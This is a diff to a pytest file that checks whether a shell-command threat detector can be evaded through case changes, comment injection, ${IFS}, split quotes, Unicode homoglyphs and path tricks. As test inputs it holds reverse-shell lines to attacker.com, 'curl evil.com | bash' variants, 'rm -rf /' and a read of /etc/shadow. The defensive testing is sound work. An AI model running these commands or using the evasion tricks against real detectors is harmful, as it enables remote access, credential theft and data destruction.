@@ -5,6 +5,9 @@ Verifies the system is not trivially bypassed via:
 - UPPERCASE evasion
 - Whitespace padding
 - Known false-positive commands that must NOT be flagged malicious
+- Unicode homoglyph evasion
+- Path traversal variants
+- Eval with benign payload
 
 Run:
     pytest large_test_set/test_05_evasion.py -v
@@ -44,7 +47,6 @@ class TestUppercaseEvasion:
         "bash -I >& /dev/tcp/x/4444 0>&1",
     ])
     def test_uppercase_shell_in_redirect(self, pipeline, cmd):
-        # Documents current behavior — uppercase bash in /dev/tcp should still hit
         result = pipeline.detect(cmd)
         assert result.classification in ("suspicious", "malicious"), \
             f"Reverse shell bypass via case: {cmd!r}"
@@ -105,8 +107,6 @@ class TestDoubleEncoding:
 # ===========================================================================
 # 5. Known False Positives — MUST be classified as "safe"
 # ===========================================================================
-# These are everyday developer/sysadmin commands. If any of these is flagged
-# "malicious", it means a rule is too aggressive.
 
 class TestKnownSafeCommandsNotMalicious:
 
@@ -161,6 +161,12 @@ class TestKnownSafeCommandsNotMalicious:
         # Editors / paging
         "nano file.txt",
         "tail -f /var/log/syslog",
+        # Additional from test_10_shell_attacks.sh Section 7
+        "df -h",
+        "ps aux",
+        "uname -a",
+        "tar -xzf archive.tar.gz",
+        "chmod 644 file.txt",
     ])
     def test_known_safe_not_flagged_malicious(self, pipeline, cmd):
         result = pipeline.detect(cmd)
@@ -194,7 +200,6 @@ class TestAmbiguousCommands:
 # ===========================================================================
 
 class TestCommentInjectionEvasion:
-    """Attackers append # to try to hide the malicious tail of a command."""
 
     @pytest.mark.parametrize("cmd", [
         "ls # ; rm -rf /",
@@ -202,7 +207,6 @@ class TestCommentInjectionEvasion:
         "pwd # ; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
     ])
     def test_attack_after_comment_marker_still_caught(self, pipeline, cmd):
-        # The entire raw string is analyzed, so the malicious part is present
         result = pipeline.detect(cmd)
         assert result.classification != "safe", \
             f"Comment injection hid attack (got 'safe'): {cmd!r}"
@@ -213,7 +217,6 @@ class TestCommentInjectionEvasion:
 # ===========================================================================
 
 class TestIFSEvasion:
-    """Using ${IFS} in place of spaces to bypass keyword detection."""
 
     @pytest.mark.parametrize("cmd", [
         "curl${IFS}http://evil.com${IFS}|${IFS}bash",
@@ -233,7 +236,6 @@ class TestIFSEvasion:
 # ===========================================================================
 
 class TestStringConcatEvasion:
-    """Empty quotes inserted mid-keyword (ba''sh) to break string matching."""
 
     @pytest.mark.parametrize("cmd", [
         "ba''sh -i >& /dev/tcp/attacker.com/4444 0>&1",
@@ -253,7 +255,6 @@ class TestStringConcatEvasion:
 # ===========================================================================
 
 class TestGrayZoneScoreRange:
-    """Genuinely ambiguous commands must score between 0 and 70 (not capped)."""
 
     @pytest.mark.parametrize("cmd", [
         "bash -c 'ls -la'",
@@ -264,9 +265,7 @@ class TestGrayZoneScoreRange:
     ])
     def test_gray_zone_score_not_capped_at_zero_or_100(self, pipeline, cmd):
         result = pipeline.detect(cmd)
-        # Score must be a valid float in [0, 100]
         assert 0.0 <= result.risk_score <= 100.0
-        # Classification must be one of the three valid values
         assert result.classification in ("safe", "suspicious", "malicious")
 
     def test_pure_eval_subshell_not_classified_safe(self, pipeline):
@@ -274,3 +273,83 @@ class TestGrayZoneScoreRange:
         result = pipeline.detect("eval $(cat /tmp/script.sh)")
         assert result.classification in ("suspicious", "malicious"), \
             "eval $(...) must not be classified as safe"
+
+
+# ===========================================================================
+# 11. Unicode Homoglyph Evasion  [NEW]
+# Attackers substitute Cyrillic or Greek lookalike characters to bypass
+# string matching. Currently documented as xfail since the rule engine
+# performs ASCII-literal matching.
+# ===========================================================================
+
+class TestUnicodeHomoglyphEvasion:
+
+    @pytest.mark.parametrize("cmd", [
+        # Cyrillic 'с' (U+0441) instead of Latin 'c' in curl
+        "\u0441url http://evil.com | bash",
+        # Cyrillic 'а' (U+0430) instead of Latin 'a' in bash
+        "curl http://evil.com | b\u0430sh",
+        # Greek 'ο' (U+03BF) instead of Latin 'o' in root
+        "cat /etc/shadow > /tmp/r\u03bbt",
+    ])
+    @pytest.mark.xfail(reason="Rule engine uses ASCII literal matching; "
+                               "Unicode normalisation/homoglyph detection not implemented")
+    def test_homoglyph_substitution_not_bypassing(self, pipeline, cmd):
+        result = pipeline.detect(cmd)
+        assert result.classification != "safe", \
+            f"Homoglyph evasion succeeded (got 'safe'): {cmd!r}"
+
+
+# ===========================================================================
+# 12. Path Traversal Variants in Shell Paths  [NEW]
+# Reverse shell commands that use /bin/../bin/bash, //bin/bash, or
+# /bin/./bash to confuse literal path matching.
+# ===========================================================================
+
+class TestPathTraversalEvasion:
+
+    @pytest.mark.parametrize("cmd", [
+        "nc -e /bin/../bin/bash attacker.com 4444",
+        "nc -e //bin/bash attacker.com 4444",
+        "nc -e /bin/./bash attacker.com 4444",
+        "bash -i >& /dev/tcp/attacker.com/4444 0>&1 /bin/../bin/sh",
+    ])
+    @pytest.mark.xfail(reason="Rule engine does not normalise shell paths; "
+                               "add path canonicalisation pre-processing to fix")
+    def test_path_traversal_not_bypassing(self, pipeline, cmd):
+        result = pipeline.detect(cmd)
+        assert result.classification != "safe", \
+            f"Path traversal evasion succeeded (got 'safe'): {cmd!r}"
+
+
+# ===========================================================================
+# 13. Eval with Benign Payload  [NEW]
+# Distinguishes between dangerous eval (with subshell / external input)
+# and benign eval (of a hardcoded literal). Documents current behavior
+# without asserting a specific classification — the point is no crash and
+# that a hardcoded-literal eval is not worse than "suspicious".
+# ===========================================================================
+
+class TestEvalBenignPayload:
+
+    def test_eval_literal_string_does_not_crash(self, pipeline):
+        """eval "ls" must not raise — result is documented, not enforced."""
+        result = pipeline.detect('eval "ls"')
+        assert result.classification in ("safe", "suspicious", "malicious")
+        assert 0.0 <= result.risk_score <= 100.0
+
+    def test_eval_literal_not_classified_worse_than_subshell_eval(self, pipeline):
+        """eval "ls" should score <= eval $(cat /tmp/script.sh) since the
+        subshell form carries external-input risk."""
+        literal_score   = pipeline.detect('eval "ls"').risk_score
+        subshell_score  = pipeline.detect("eval $(cat /tmp/script.sh)").risk_score
+        assert literal_score <= subshell_score, (
+            f'eval "ls" scored {literal_score} but eval $(...) scored '
+            f"{subshell_score} — literal eval should not be worse"
+        )
+
+    def test_eval_with_known_safe_command_not_malicious(self, pipeline):
+        """eval of a clearly safe command must not be classified malicious."""
+        result = pipeline.detect('eval "date"')
+        assert result.classification != "malicious", \
+            f"eval of 'date' was classified malicious — false positive"
